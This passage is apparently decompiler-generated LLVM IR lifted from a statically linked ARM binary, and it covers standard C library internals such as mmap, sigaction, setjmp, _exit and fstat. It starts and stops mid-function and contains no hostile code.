dec_label_pc_15e98:                               ; preds = %dec_label_pc_15e70, %dec_label_pc_15e88
  %v2_15e9c = phi i32 [ %v2_15e74.pre, %dec_label_pc_15e70 ], [ %v2_15e9c.pre, %dec_label_pc_15e88 ]
  store i32 128, i32* %r3.global-to-local, align 4
  store i32 %v2_15e9c, i32* %r1.global-to-local, align 4
  %v2_15ea0 = add i32 %v2_15e9c, 128
  %v3_15ea0 = inttoptr i32 %v2_15ea0 to i32*
  %v4_15ea0 = load i32, i32* %v3_15ea0, align 4
  store i32 %v4_15ea0, i32* %r2.global-to-local, align 4
  store i32 %v4_15ea0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15ea8 = icmp eq i32 %v4_15ea0, 0
  store i1 %v2_15ea8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15ea8, label %dec_label_pc_15ec0, label %dec_label_pc_15eb0

dec_label_pc_15eb0:                               ; preds = %dec_label_pc_15e98
  store i32 89784, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_15ea0)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_15ebc = load i32, i32* %r0.global-to-local, align 4
  %v2_15ebc = inttoptr i32 %v1_15ebc to i32*
  store i32 0, i32* %v2_15ebc, align 4
  br label %dec_label_pc_15ec0

dec_label_pc_15ec0:                               ; preds = %dec_label_pc_15e98, %dec_label_pc_15eb0
  %v2_15ec0 = ptrtoint i32* %stack_var_-400 to i32
  store i32 %v2_15ec0, i32* @r0, align 4
  %v1_15ec4 = call i32 @_setjmp(i32 %v2_15ec0)
  store i32 %v1_15ec4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15ec8 = icmp eq i32 %v1_15ec4, 0
  store i1 %v2_15ec8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15ec8, label %dec_label_pc_15ed0, label %dec_label_pc_15f1c

dec_label_pc_15ed0:                               ; preds = %dec_label_pc_15ec0
  %v0_15ed0 = call i32 @__aeabi_read_tp()
  store i32 %v0_15ed0, i32* %r0.global-to-local, align 4
  %v1_15ed4 = add i32 %v0_15ed0, -1168
  store i32 %v1_15ed4, i32* %r2.global-to-local, align 4
  %v2_15edc = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_15edc, i32* %r4.global-to-local, align 4
  store i32 56, i32* %r3.global-to-local, align 4
  %v2_15ee8 = add i32 %v2_15edc, 56
  %v3_15ee8 = inttoptr i32 %v2_15ee8 to i32*
  %v4_15ee8 = load i32, i32* %v3_15ee8, align 4
  store i32 %v4_15ee8, i32* %ip.global-to-local, align 4
  store i32 %v2_15ec0, i32* %r3.global-to-local, align 4
  %v2_15ef8 = add i32 %v0_15ed0, -1040
  %v3_15ef8 = inttoptr i32 %v2_15ef8 to i32*
  store i32 %v2_15ec0, i32* %v3_15ef8, align 4
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v0_15f04 = load i32, i32* %ip.global-to-local, align 4
  %v1_15f04 = inttoptr i32 %v0_15f04 to i32*
  %v2_15f04 = load i32, i32* %v1_15f04, align 4
  store i32 %v2_15f04, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r5.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v0_15f14 = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15fb8

dec_label_pc_15f1c:                               ; preds = %dec_label_pc_15ec0
  store i32 40, i32* %r3.global-to-local, align 4
  %v2_15f20 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_15f20, i32* %ip.global-to-local, align 4
  %v2_15f24 = add i32 %v2_15f20, 40
  %v3_15f24 = inttoptr i32 %v2_15f24 to i32*
  %v4_15f24 = load i32, i32* %v3_15f24, align 4
  store i32 %v4_15f24, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_15f24)
  store i32 120, i32* %r3.global-to-local, align 4
  %v2_15f34 = load i32, i32* %stack_var_-416, align 4
  %v2_15f38 = add i32 %v2_15f34, 120
  %v3_15f38 = inttoptr i32 %v2_15f38 to i32*
  %v4_15f38 = load i32, i32* %v3_15f38, align 4
  store i32 %v4_15f38, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15f3c

dec_label_pc_15f3c:                               ; preds = %dec_label_pc_15f70.dec_label_pc_15f3c_crit_edge, %dec_label_pc_15f1c
  %v0_15f3c = phi i32 [ %v0_15f3c.pre, %dec_label_pc_15f70.dec_label_pc_15f3c_crit_edge ], [ %v4_15f38, %dec_label_pc_15f1c ]
  %v1_15f3c = inttoptr i32 %v0_15f3c to i32*
  %v2_15f3c = load i32, i32* %v1_15f3c, align 4
  store i32 %v0_15f3c, i32* %r2.global-to-local, align 4
  store i32 %v2_15f3c, i32* %r4.global-to-local, align 4
  %v1_15f48 = add i32 %v2_15f3c, -1
  store i32 %v1_15f48, i32* %r1.global-to-local, align 4
  %v2_15f4c89 = load i32, i32* %v1_15f3c, align 4
  store i32 %v2_15f4c89, i32* %r3.global-to-local, align 4
  %v3_15f5091 = icmp uge i32 %v2_15f4c89, %v2_15f3c
  store i1 %v3_15f5091, i1* %cpsr_c.global-to-local, align 1
  %v9_15f5097 = icmp eq i32 %v2_15f4c89, %v2_15f3c
  store i1 %v9_15f5097, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15f5097, label %dec_label_pc_15f58, label %dec_label_pc_15f70

dec_label_pc_15f58:                               ; preds = %dec_label_pc_15f3c, %dec_label_pc_15f58.dec_label_pc_15f4c_crit_edge
  %v0_15f5898 = phi i32 [ %v1_15f50.pre, %dec_label_pc_15f58.dec_label_pc_15f4c_crit_edge ], [ %v2_15f3c, %dec_label_pc_15f3c ]
  store i32 %v0_15f5898, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15f68 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15f68, label %dec_label_pc_15f6c, label %dec_label_pc_15f58.dec_label_pc_15f4c_crit_edge

dec_label_pc_15f58.dec_label_pc_15f4c_crit_edge:  ; preds = %dec_label_pc_15f58
  %v0_15f4c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15f50.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_15f4c = inttoptr i32 %v0_15f4c.pre to i32*
  %v2_15f4c = load i32, i32* %v1_15f4c, align 4
  store i32 %v2_15f4c, i32* %r3.global-to-local, align 4
  %v3_15f50 = icmp uge i32 %v2_15f4c, %v1_15f50.pre
  store i1 %v3_15f50, i1* %cpsr_c.global-to-local, align 1
  %v9_15f50 = icmp eq i32 %v2_15f4c, %v1_15f50.pre
  store i1 %v9_15f50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15f50, label %dec_label_pc_15f58, label %dec_label_pc_15f70

dec_label_pc_15f6c:                               ; preds = %dec_label_pc_15f58
  %v0_15f6c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15f6c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15f70

dec_label_pc_15f70:                               ; preds = %dec_label_pc_15f3c, %dec_label_pc_15f58.dec_label_pc_15f4c_crit_edge, %dec_label_pc_15f6c
  %v0_15f78 = phi i32 [ %v0_15f6c, %dec_label_pc_15f6c ], [ %v2_15f4c89, %dec_label_pc_15f3c ], [ %v2_15f4c, %dec_label_pc_15f58.dec_label_pc_15f4c_crit_edge ]
  %v1_15f70 = phi i32 [ %v0_15f6c, %dec_label_pc_15f6c ], [ %v2_15f3c, %dec_label_pc_15f3c ], [ %v1_15f50.pre, %dec_label_pc_15f58.dec_label_pc_15f4c_crit_edge ]
  %v3_15f70 = icmp uge i32 %v0_15f78, %v1_15f70
  store i1 %v3_15f70, i1* %cpsr_c.global-to-local, align 1
  %v9_15f70 = icmp eq i32 %v0_15f78, %v1_15f70
  store i1 %v9_15f70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15f70, label %dec_label_pc_15f78, label %dec_label_pc_15f70.dec_label_pc_15f3c_crit_edge

dec_label_pc_15f70.dec_label_pc_15f3c_crit_edge:  ; preds = %dec_label_pc_15f70
  %v0_15f3c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15f3c

dec_label_pc_15f78:                               ; preds = %dec_label_pc_15f70
  %v2_15f78 = icmp ne i32 %v1_15f70, 0
  store i1 %v2_15f78, i1* %cpsr_c.global-to-local, align 1
  %v7_15f78 = icmp eq i32 %v1_15f70, 1
  store i1 %v7_15f78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15f78, label %dec_label_pc_15fb8, label %dec_label_pc_15f80

dec_label_pc_15f80:                               ; preds = %dec_label_pc_15f78
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r7.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15fb8

dec_label_pc_15fb8:                               ; preds = %dec_label_pc_15f78, %dec_label_pc_15f80, %dec_label_pc_15ed0
  %storemerge2 = phi i32 [ %v0_15f14, %dec_label_pc_15ed0 ], [ 0, %dec_label_pc_15f80 ], [ 0, %dec_label_pc_15f78 ]
  store i32 %storemerge2, i32* %r1.global-to-local, align 4
  store i32 %storemerge2, i32* %r0.global-to-local, align 4
  %v1_15fbc = call i32 @__GI_exit(i32 %storemerge2)
  store i32 %v1_15fbc, i32* %r0.global-to-local, align 4
  %v0_15fc0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15fc0, label %bb85, label %.thread9

bb85:                                             ; preds = %dec_label_pc_15fb8
  %v2_15fc0 = load i32, i32* %ip.global-to-local, align 4
  %v2_15fc4 = load i32, i32* @r8, align 4
  %v8_15fc4 = shl i32 %v2_15fc4, %v1_15fbc
  %v9_15fc4 = and i32 %v8_15fc4, %v1_15fbc
  %v8_15fc8 = lshr i32 %v2_15fc4, %v9_15fc4
  %v9_15fc8 = and i32 %v8_15fc8, %v9_15fc4
  %v2_15fcc = inttoptr i32 %v9_15fc8 to i64*
  %v3_15fcc = load i64, i64* %v2_15fcc, align 4
  %v5_15fcc = trunc i64 %v3_15fcc to i32
  %v6_15fcc = udiv i64 %v3_15fcc, 4294967296
  %v7_15fcc = trunc i64 %v6_15fcc to i32
  store i32 %v5_15fcc, i32* %r1.global-to-local, align 4
  %v9_15fcc = sub i32 %v7_15fcc, %v2_15fc0
  %v1_15fd0 = load i32, i32* %r4.global-to-local, align 4
  %v3_15fd0 = mul i32 %v9_15fcc, %v1_15fd0
  %v5_15fd8 = mul i32 %v1_15fd0, 4
  %v5_15fdc = udiv i32 %v1_15fd0, 2
  %v6_15fd8 = and i32 %v5_15fdc, %v5_15fd8
  %v6_15fdc = and i32 %v6_15fd8, %v3_15fd0
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i32 %v6_15fdc, i32* %r0.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_15fb8, %bb85
  %v5_15fe0 = phi i32 [ %v1_15fbc, %dec_label_pc_15fb8 ], [ %v6_15fdc, %bb85 ]
  ret i32 %v5_15fe0

; uselistorder directives
  uselistorder i32 %v1_15fd0, { 1, 0, 2 }
  uselistorder i32 %v1_15fbc, { 1, 0, 2, 3 }
  uselistorder i32 %storemerge2, { 1, 0, 2 }
  uselistorder i32 %v1_15f70, { 1, 0, 2, 3 }
  uselistorder i32 %v0_15f6c, { 1, 0, 2 }
  uselistorder i32 %v1_15f50.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_15f3c, { 1, 0 }
  uselistorder i32 %v2_15e9c, { 1, 0 }
  uselistorder i32 %v2_15e74.pre, { 2, 0, 1 }
  uselistorder i32 %v1_15e68, { 1, 0 }
  uselistorder i32 %v1_15e64, { 3, 2, 1, 0 }
  uselistorder i32 %v1_15e58, { 1, 0 }
  uselistorder i32 %v1_15e24, { 1, 0 }
  uselistorder i32 %v1_15e20, { 1, 2, 3, 0 }
  uselistorder i32 %v1_15e14, { 1, 0 }
  uselistorder i32 %v2_15df0, { 1, 0, 2 }
  uselistorder i32 %v4_15dd4, { 1, 0, 2 }
  uselistorder i32 %v4_15dc4, { 1, 0, 2, 3 }
  uselistorder i1 %v8_15d0c, { 1, 2, 0 }
  uselistorder i32 %v2_15cd8, { 1, 2, 0 }
  uselistorder i32 %v1_15cd4, { 1, 2, 0 }
  uselistorder i1 %v2_15cc0, { 1, 0, 2 }
  uselistorder i32 %v5_15cc4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_15c90, { 1, 0, 2, 3 }
  uselistorder i32 %v0_15c78, { 1, 0, 2 }
  uselistorder i32 %v2_15c6c, { 1, 0, 2 }
  uselistorder i32 %v3_15c3c, { 1, 0 }
  uselistorder i32* %stack_var_-416, { 2, 3, 4, 0, 1, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32 %tmp65, { 1, 2, 5, 0, 3, 4 }
  uselistorder i32 %tmp64, { 2, 1, 0 }
  uselistorder i32 %tmp63, { 2, 1, 0 }
  uselistorder i32 %tmp62, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 3, 1, 0, 2, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i32* %r3.global-to-local, { 4, 6, 5, 3, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 2, 26, 27, 28, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0 }
  uselistorder i32* %r1.global-to-local, { 5, 2, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 1, 3, 4, 17, 18, 19, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 4, 5, 6, 7, 8, 12, 9, 10, 11, 17, 13, 14, 15, 16, 19, 18, 20, 21, 22, 25, 23, 24, 27, 26, 0 }
  uselistorder i32* %ip.global-to-local, { 2, 0, 1, 3, 4, 5, 6, 7, 9, 8, 10, 11 }
  uselistorder i1* %cpsr_z.global-to-local, { 8, 4, 5, 6, 7, 3, 9, 10, 11, 12, 0, 13, 14, 1, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 2, 26 }
  uselistorder i1* %cpsr_c.global-to-local, { 4, 5, 6, 7, 9, 8, 3, 10, 11, 12, 14, 13, 0, 15, 17, 16, 1, 18, 19, 20, 21, 22, 23, 24, 25, 26, 29, 27, 28, 2, 30 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 (i32, i32)* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 536870912, { 3, 2, 0, 1, 4 }
  uselistorder i32 120, { 0, 2, 1, 4, 3 }
  uselistorder i32 2012, { 1, 0, 2, 3 }
  uselistorder i32 %arg6, { 1, 0, 2 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %dec_label_pc_15fb8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15f70, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15f58, { 1, 0 }
  uselistorder label %dec_label_pc_15ec0, { 1, 0 }
  uselistorder label %dec_label_pc_15e98, { 1, 0 }
  uselistorder label %dec_label_pc_15e14, { 1, 0 }
  uselistorder label %bb84, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15d90, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15d68, { 3, 0, 1, 2 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %dec_label_pc_15cd8, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
  uselistorder label %dec_label_pc_15cc0, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
  uselistorder label %bb75, { 1, 0 }
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1600c = load i32, i32* @r4, align 4
  store i32 %v3_1600c, i32* %stack_var_-16, align 4
  %v3_16018 = urem i32 %arg3, 4096
  %v2_1601c = icmp eq i32 %v3_16018, 0
  br i1 %v2_1601c, label %dec_label_pc_16040, label %dec_label_pc_16024

dec_label_pc_16024:                               ; preds = %entry
  %v0_16028 = call i32 @__aeabi_read_tp()
  store i32 %v0_16028, i32* %r0.global-to-local, align 4
  %v3_1602c = load i16, i16* @global_var_23424.488, align 2
  %v4_1602c = sext i16 %v3_1602c to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_16038 = add i32 %v4_1602c, %v0_16028
  %v4_16038 = inttoptr i32 %v3_16038 to i32*
  store i32 22, i32* %v4_16038, align 4
  %v0_16074.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16074

dec_label_pc_16040:                               ; preds = %entry
  %v0_16050 = load i32, i32* %r0.global-to-local, align 4
  %tmp = icmp ult i32 %v0_16050, -4095
  br i1 %tmp, label %dec_label_pc_16070, label %dec_label_pc_16058

dec_label_pc_16058:                               ; preds = %dec_label_pc_16040
  %v1_1605c = sub i32 0, %v0_16050
  %v3_16060 = load i16, i16* @global_var_23424.488, align 2
  %v4_16060 = sext i16 %v3_16060 to i32
  %v0_16064 = call i32 @__aeabi_read_tp()
  %v3_16068 = add i32 %v4_16060, %v0_16064
  %v4_16068 = inttoptr i32 %v3_16068 to i32*
  store i32 %v1_1605c, i32* %v4_16068, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16070

dec_label_pc_16070:                               ; preds = %dec_label_pc_16040, %dec_label_pc_16058
  %v0_16070 = phi i32 [ %v0_16050, %dec_label_pc_16040 ], [ -1, %dec_label_pc_16058 ]
  store i32 %v0_16070, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16074

dec_label_pc_16074:                               ; preds = %dec_label_pc_16024, %dec_label_pc_16070
  %v0_16074 = phi i32 [ %v0_16074.pre, %dec_label_pc_16024 ], [ %v0_16070, %dec_label_pc_16070 ]
  store i32 %v0_16074, i32* %r0.global-to-local, align 4
  %v2_16078 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_16078, i32* @r4, align 4
  ret i32 %v0_16074

; uselistorder directives
  uselistorder i32 %v0_16074, { 1, 0 }
  uselistorder i32 %v0_16050, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 4, 1 }
  uselistorder label %dec_label_pc_16074, { 1, 0 }
  uselistorder label %dec_label_pc_16070, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_16088 = load i32, i32* @lr, align 4
  store i32 %v0_16088, i32* %stack_var_-4, align 4
  %v0_16090 = load i32, i32* @r0, align 4
  %v3_16094 = load i16, i16* @global_var_23424.488, align 2
  %v4_16094 = sext i16 %v3_16094 to i32
  store i32 %v4_16094, i32* @r2, align 4
  %v0_16098 = call i32 @__aeabi_read_tp()
  %v1_1609c = sub i32 0, %v0_16090
  store i32 %v1_1609c, i32* @r3, align 4
  %v2_160a0 = load i32, i32* @r2, align 4
  %v3_160a0 = add i32 %v2_160a0, %v0_16098
  %v4_160a0 = inttoptr i32 %v3_160a0 to i32*
  store i32 %v1_1609c, i32* %v4_160a0, align 4
  %v2_160a8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_160a8, i32* @lr, align 4
  ret i32 -1
}

define i32 @__libc_sigaction(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_160b4 = load i32, i32* @r4, align 4
  %v6_160b4 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @ip, align 4
  %v2_160bc = icmp eq i32 %arg2, 0
  store i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  br i1 %v2_160bc, label %dec_label_pc_16110, label %dec_label_pc_160d4

dec_label_pc_160d4:                               ; preds = %entry
  %v1_160d4 = add i32 %arg2, 4
  %v2_160d4 = inttoptr i32 %v1_160d4 to i32*
  %v3_160d4 = load i32, i32* %v2_160d4, align 4
  store i32 %v3_160d4, i32* @r3, align 4
  %v1_160d8 = and i32 %v3_160d4, 67108864
  %v2_160d8 = icmp eq i32 %v1_160d8, 0
  br i1 %v2_160d8, label %dec_label_pc_160e0, label %dec_label_pc_16110

dec_label_pc_160e0:                               ; preds = %dec_label_pc_160d4
  store i32 20, i32* @r2, align 4
  %v2_160e4 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_160e4, i32* @r0, align 4
  %v0_160e8 = call i32 @memcpy()
  store i32 %v2_160e4, i32* @ip, align 4
  %v0_16110.pre = load i32, i32* @r5, align 4
  %v0_16118.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_16110

dec_label_pc_16110:                               ; preds = %dec_label_pc_160d4, %entry, %dec_label_pc_160e0
  %v0_16118 = phi i32 [ %arg3, %dec_label_pc_160d4 ], [ %arg3, %entry ], [ %v0_16118.pre, %dec_label_pc_160e0 ]
  %v0_16114 = phi i32 [ %arg2, %dec_label_pc_160d4 ], [ 0, %entry ], [ %v2_160e4, %dec_label_pc_160e0 ]
  %v0_16110 = phi i32 [ %arg1, %dec_label_pc_160d4 ], [ %arg1, %entry ], [ %v0_16110.pre, %dec_label_pc_160e0 ]
  %v4_16120 = call i32 @__syscall_rt_sigaction(i32 %v0_16110, i32 %v0_16114, i32 %v0_16118, i32 8)
  store i32 %v3_160b4, i32* @r4, align 4
  store i32 %v6_160b4, i32* @r5, align 4
  ret i32 %v4_16120

; uselistorder directives
  uselistorder label %dec_label_pc_16110, { 2, 0, 1 }
}

define i32 @function_16134(i32 %arg1) local_unnamed_addr {
dec_label_pc_16134:
  %v0_16134 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16134, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_16134
  %v2_16134 = load i32, i32* @r8, align 4
  %v4_16134 = mul i32 %v2_16134, 2
  %v5_16134 = and i32 %v4_16134, %arg1
  %v2_16138 = load i32, i32* @ip, align 4
  %v4_16138 = lshr i32 %v2_16138, %v5_16134
  %v5_16138 = sub i32 32, %v5_16134
  %v6_16138 = shl i32 %v2_16138, %v5_16138
  %v7_16138 = or i32 %v6_16138, %v4_16138
  %v9_16138 = and i32 %v7_16138, %v5_16134
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_16134, %bb
  %v10_16138 = phi i32 [ %arg1, %dec_label_pc_16134 ], [ %v9_16138, %bb ]
  ret i32 %v10_16138

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @_setjmp(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  %v0_16140 = call i32 @__sigsetjmp()
  ret i32 %v0_16140
}

define i32 @__default_sa_restorer(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 %arg1
}

define i32 @__default_rt_sa_restorer(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 %arg1
}

define i32 @__aeabi_read_tp() local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 -61472)
  ret i32 -61441
}

define i32 @__syscall_rt_sigaction(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_16170 = load i32, i32* @r7, align 4
  store i32 %v3_16170, i32* %stack_var_-8, align 4
  %v0_1617c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1617c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1617c, -4095
  br i1 %tmp, label %dec_label_pc_161a4, label %dec_label_pc_1618c

dec_label_pc_1618c:                               ; preds = %entry
  %v0_16190 = call i32 @__aeabi_read_tp()
  %v3_16194 = load i16, i16* @global_var_23424.488, align 2
  %v4_16194 = sext i16 %v3_16194 to i32
  %v0_16198 = load i32, i32* %r2.global-to-local, align 4
  %v1_16198 = sub i32 0, %v0_16198
  store i32 %v1_16198, i32* %r2.global-to-local, align 4
  %v3_1619c = add i32 %v4_16194, %v0_16190
  %v4_1619c = inttoptr i32 %v3_1619c to i32*
  store i32 %v1_16198, i32* %v4_1619c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_161a4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_161a4

dec_label_pc_161a4:                               ; preds = %entry, %dec_label_pc_1618c
  %v1_161a8 = phi i32 [ %v0_1617c, %entry ], [ -1, %dec_label_pc_1618c ]
  %v2_161a4 = phi i32 [ %v3_16170, %entry ], [ %v2_161a4.pre, %dec_label_pc_1618c ]
  store i32 %v2_161a4, i32* @r7, align 4
  ret i32 %v1_161a8

; uselistorder directives
  uselistorder i32 %v0_1617c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_161a4, { 1, 0 }
}

define i32 @__GI__exit(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_161bc

dec_label_pc_161bc:                               ; preds = %dec_label_pc_161e8, %dec_label_pc_161fc, %entry
  %v0_161bc = phi i32 [ %arg1, %entry ], [ %v0_161bc.pre.pre, %dec_label_pc_161fc ], [ %v0_161e8, %dec_label_pc_161e8 ]
  store i32 %v0_161bc, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_161bc, -4095
  br i1 %tmp, label %dec_label_pc_161e8, label %dec_label_pc_161d8

dec_label_pc_161d8:                               ; preds = %dec_label_pc_161bc
  %v0_161d8 = call i32 @__aeabi_read_tp()
  %v0_161dc = load i32, i32* %r2.global-to-local, align 4
  %v1_161dc = sub i32 0, %v0_161dc
  store i32 %v1_161dc, i32* %r2.global-to-local, align 4
  %v3_161e0 = load i16, i16* @global_var_23424.488, align 2
  %v4_161e0 = sext i16 %v3_161e0 to i32
  %v3_161e4 = add i32 %v4_161e0, %v0_161d8
  %v4_161e4 = inttoptr i32 %v3_161e4 to i32*
  store i32 %v1_161dc, i32* %v4_161e4, align 4
  %v0_161e8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_161e8

dec_label_pc_161e8:                               ; preds = %dec_label_pc_161bc, %dec_label_pc_161d8
  %v0_161e8 = phi i32 [ %v0_161bc, %dec_label_pc_161bc ], [ %v0_161e8.pre, %dec_label_pc_161d8 ]
  store i32 %v0_161e8, i32* %r2.global-to-local, align 4
  %tmp4 = icmp ult i32 %v0_161e8, -4095
  br i1 %tmp4, label %dec_label_pc_161bc, label %dec_label_pc_161fc

dec_label_pc_161fc:                               ; preds = %dec_label_pc_161e8
  %v0_161fc = call i32 @__aeabi_read_tp()
  %v0_16200 = load i32, i32* %r2.global-to-local, align 4
  %v1_16200 = sub i32 0, %v0_16200
  store i32 %v1_16200, i32* %r2.global-to-local, align 4
  %v3_16204 = load i16, i16* @global_var_23424.488, align 2
  %v4_16204 = sext i16 %v3_16204 to i32
  %v3_16208 = add i32 %v4_16204, %v0_161fc
  %v4_16208 = inttoptr i32 %v3_16208 to i32*
  store i32 %v1_16200, i32* %v4_16208, align 4
  %v0_161bc.pre.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_161bc

; uselistorder directives
  uselistorder i32 %v0_161e8, { 0, 2, 1 }
  uselistorder i32 %v0_161bc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_161e8, { 1, 0 }
  uselistorder label %dec_label_pc_161bc, { 1, 0, 2 }
}

define i32 @fstat() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %v0_16220 = load i32, i32* @r1, align 4
  store i32 %v0_16220, i32* @r3, align 4
  store i32 197, i32* %r7.global-to-local, align 4
  %v0_16230 = load i32, i32* @r0, align 4
  store i32 %v0_16230, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_16230, -4095
  br i1 %tmp, label %dec_label_pc_16258, label %dec_label_pc_1623c

dec_label_pc_1623c:                               ; preds = %entry
  %v0_16240 = call i32 @__aeabi_read_tp()
  %v3_16244 = load i16, i16* @global_var_23424.488, align 2
  %v4_16244 = sext i16 %v3_16244 to i32
  store i32 %v4_16244, i32* @r3, align 4
  %v0_16248 = load i32, i32* @r2, align 4
  %v1_16248 = sub i32 0, %v0_16248
  store i32 %v1_16248, i32* @r2, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v3_16250 = add i32 %v4_16244, %v0_16240
  %v4_16250 = inttoptr i32 %v3_16250 to i32*
  store i32 %v1_16248, i32* %v4_16250, align 4
  br label %dec_label_pc_16268

dec_label_pc_16258:                               ; preds = %entry
  store i32 %v0_16230, i32* %r7.global-to-local, align 4
  %v2_16258 = icmp eq i32 %v0_16230, 0
